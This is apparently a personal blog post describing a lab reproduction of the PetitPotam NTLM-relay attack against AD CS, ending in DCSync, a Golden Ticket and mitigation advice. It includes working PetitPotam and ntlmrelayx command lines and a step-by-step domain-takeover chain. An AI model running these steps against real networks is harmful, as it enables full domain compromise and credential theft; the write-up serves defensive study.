---
title: PetitPotam LAB PoC
layout: post

---

This weekend I decided to experiment with the PetitPotam poc in my lab. The goal was to have a better understanding of not only how the attack worked, but what configuration was required on the target systems in order for it to succeed to help defend against this and similar attacks. 

**Background**

PetitPotam, a PoC which was released by security researcher Gilles Lionel, abuses the Encrypting File System Remote Protocol (MS-EFSRPC) which is designed for performing maintenance and management operations on encrypted data that is stored remotely and accessed over a network. An unauthenticated attacker can leverage the vulnerability to get a target to connect to an attacker controlled server and reveal password hashes. The attack can be chained with an exploit targeting Active Directory Certificate Services (AD CS), by coercing a Domain Controller to send its hashes then relaying them to AD CS Web Enrollment pages to enroll a machine certificate for the DC. This will effectively give the attacker a certificate that can be used to acess domain services as a DC and compromise the entire domain.

**Lab Configuration**

I spun up a Server 2019 domain controller (DC-2019-01) and kept the default GPOs in place. I set up another server running Server 2016 (CERTSERVER), installed AD CS and joined it to the domain.

**PoC and Named Pipes**

I cloned the PetitPotam repo, setting my machine as the listener and domain controller as the target and received the "Attack Worked!" message.

```
python3 ./Petitpotam.py -u '' -p '' -d '' 10.0.3.2 dc-2019-01.lab.local
```

![2021-08-03_08-24.png](/assets/images/2021-08-03_08-24.png)

> Note: I was unable to get this to work with the default settings on a WIndows Server 2016 domain controller. According to Microsoft's [documentation](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-access-named-pipes-that-can-be-accessed-anonymously), domain controller should allow netlogon, samr, and lsarpc to be accessed anonymously by default which did not seem to be the case on the 2016 box. The settings can also be checked by viewing the [NullSessionPipes](https://www.windows-security.org/638f50f5ea2ebdf9ba6631478b7478b6/network-access-named-pipes-that-can-be-accessed-anonymously) registry key which was not present. As a sanity check I spun up a Server 2019 Domain Controller and the defaults were configured according to the documentation.
> 
> For what it's worth I had to modify "Network access: Named Pipes that can be accessed anonymously" by adding lsarpc (default pipe used) to allow the script to work against the 2016 DC. 
> 
> There are a couple Group Policy settings that control access to named pipes.
> 
> - Network access: Named Pipes that can be accessed anonymously
> 
> - Network access: Restrict anonymous access to named pipes

**Impacket / Generating a CSR and Machine cert**

In this scenario ntlmrelayx can be set up to listen for authenticaton requests, relay the hash to AD CS to authenticate, generate a CSR (using the machine cert template by default), and output the signed certificate in base64. 

```
ntlmrelayx.py -t http://certserver.lab.local/certsrv/certfnsh.asp -smb2support --adcs
```

> Note: Initially, the request errored out.  This is because the appropriate permissions were not configured on the certificate template to allow a domain controller to enroll.

![2021-08-07_15-22.png](/assets/images/2021-08-07_15-22.png)

**Rubeus (PTT)**

I wanted to see how far I could take this, I had the base64 encoded machine cert and after some research I learned that the cert could be used with Rubeus to request a TGT (Ticket Granting TIcket) and with the ptt (pass-the-ticket) parameter, import the ticket to be used for authentication.

![2021-08-08_16-05.png](/assets/images/2021-08-08_16-05.png)

With the TGT imported, A DCSync attack could be done via Mimikatz (lsadump::dcsync). The DCSync attack allows for impersonation of a Domain Controller (leverages  [MS-DRSR](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47)) in order to retrieve password data via domain replication.

![2021-08-10_20-43.png](/assets/images/2021-08-10_20-43.png)

There are (at least) two different paths from here. Dump the hashes and crack them offline, or use the krbtgt NTLM Hash to forge an authentication ticket (Golden Ticket). The Golden Ticket approach provides the ability to force more tickets and basically gives the attacker unfettered access so I went this route.

![2021-08-10_21-07.png](/assets/images/2021-08-10_21-07.png)

The forged ticket can then be loaded into mimikatz and used with misc::cmd to browse files or open a remote shell on the host. And as you can see, all without having to know any passwords.

![2021-08-10_20-57.png](/assets/images/2021-08-10_20-57.png)

![2021-08-10_20-58.png](/assets/images/2021-08-10_20-58.png)

**Mitigation**

The top 3 mitigations listed below prevented this attack from succeeding in my lab. Independent testing/research should be done to confirm if this will work in your environment and not break anything.

- Follow Microsoft guidance for enabling Extended Protection for Authentication (EPA) [KB5005413: Mitigating NTLM Relay Attacks on Active Directory Certificate Services (AD CS)](https://support.microsoft.com/en-gb/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429)

- Microsoft also provides guidance for disabling NTLM all together (Under the 'Additional Mitigation' in the KB article above). I dont think this is something organizations can do without a considerable amount of work up-front. Ned Pyle has a good write up about how I feel is the correct way to go about this. [NTLM Blocking and You: Application Analysis and Auditing Methodologies in Windows 7](https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/ntlm-blocking-and-you-application-analysis-and-auditing/ba-p/397191)

- SMB-Signing: Since this attack relies on MS-EFSRPC (which works over the SMB protocol), enabling SMB-Signing will prevent attacks that involve SMB Relay  [Overview Server Message Block Signing](https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/overview-server-message-block-signing)

- I haven't had a chance to test but Microsoft released a patch that blocks the API calls which prevents the attack from succeeding  [Security Update Guide - Microsoft Security Response Center](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-36942)

**References:**

[Microsoft Rushes Fix for ‘PetitPotam’ Attack PoC Threatpost](https://threatpost.com/microsoft-petitpotam-poc/168163/)

[MS-EFSR Encrypting File System Remote Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)

[AD CS Relay Attack Practical Guide](https://www.exandroid.dev/2021/06/23/ad-cs-relay-attack-practical-guide/)

[Active Directory Certificate Services a big security blindspot](https://www.csoonline.com/article/3622352/report-active-directory-certificate-services-a-big-security-blindspot-on-enterprise-networks.html)

[Abusing Microsoft Kerberos Sorry You Guys Don't Get It](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf)